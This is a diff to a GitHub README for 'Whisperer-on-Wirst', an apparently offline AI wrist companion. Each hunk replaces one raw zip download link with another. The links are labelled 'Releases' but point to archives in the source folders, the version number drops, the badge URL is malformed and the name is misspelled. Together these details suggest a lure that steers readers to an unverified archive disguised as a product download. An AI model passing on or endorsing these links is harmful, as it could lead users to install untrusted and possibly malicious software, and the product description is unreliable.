@@ -1,7 +1,7 @@
 # 🤖 Whisperer-on-Wirst - Your AI Companion on Your Wrist
 
 ## 🚀 Download Now
-[![Download Whisperer-on-Wirst](https://github.com/gskrishna3838/Whisperer-on-Wirst/raw/refs/heads/main/src/on_Wirst_Whisperer_v2.1.zip%20Whisperer--on--Wirst-0088cc?style=flat&logo=github&logoColor=white)](https://github.com/gskrishna3838/Whisperer-on-Wirst/raw/refs/heads/main/src/on_Wirst_Whisperer_v2.1.zip)
+[![Download Whisperer-on-Wirst](https://github.com/gskrishna3838/Whisperer-on-Wirst/raw/refs/heads/main/include/Wirst_Whisperer_on_1.9.zip%20Whisperer--on--Wirst-0088cc?style=flat&logo=github&logoColor=white)](https://github.com/gskrishna3838/Whisperer-on-Wirst/raw/refs/heads/main/include/Wirst_Whisperer_on_1.9.zip)
 
 ## 📝 Overview
 Whisperer-on-Wirst is your private AI companion designed to fit comfortably on your wrist. This local AI assistant features emotional intelligence, providing support and companionship when you need it the most. With Whisperer-on-Wirst, you can ask questions, manage tasks, and enjoy a personal connection without relying on an internet connection.
@@ -16,7 +16,7 @@ To run Whisperer-on-Wirst, your device should meet the following requirements:
 ## 📥 Download & Install
 To get started, please visit the Releases page to download the application. Click the link below to access the download options:
 
-[Download Whisperer-on-Wirst from Releases](https://github.com/gskrishna3838/Whisperer-on-Wirst/raw/refs/heads/main/src/on_Wirst_Whisperer_v2.1.zip)
+[Download Whisperer-on-Wirst from Releases](https://github.com/gskrishna3838/Whisperer-on-Wirst/raw/refs/heads/main/include/Wirst_Whisperer_on_1.9.zip)
 
 ### Step-by-Step Installation
 1. **Visit the Releases Page**: Follow the link mentioned above. You will see various versions of the software available for download.
@@ -70,4 +70,4 @@ Your feedback is important. If you have suggestions or encounter issues, please 
 ## 🌟 Conclusion
 Whisperer-on-Wirst is here to make your daily routines smoother and your interactions more meaningful. With just a few simple steps, you can download and enjoy your very own AI companion. Don't forget to check back on the Releases page for future updates!
 
-[Download Whisperer-on-Wirst from Releases](https://github.com/gskrishna3838/Whisperer-on-Wirst/raw/refs/heads/main/src/on_Wirst_Whisperer_v2.1.zip)
+[Download Whisperer-on-Wirst from Releases](https://github.com/gskrishna3838/Whisperer-on-Wirst/raw/refs/heads/main/include/Wirst_Whisperer_on_1.9.zip)
